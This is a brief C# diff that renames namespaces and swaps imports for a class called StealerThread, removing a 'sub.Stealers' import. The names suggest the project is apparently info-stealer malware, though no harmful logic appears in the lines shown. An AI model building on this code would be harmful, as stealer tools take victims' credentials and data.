@@ -1,8 +1,9 @@
 ﻿using System.Threading;
 using System.Windows.Forms;
-using sub.Stealers;
+using sub.Util.Misc;
+using sub.Util.Net;
 
-namespace sub
+namespace sub.Util.Threading
 {
     internal class StealerThread
     {
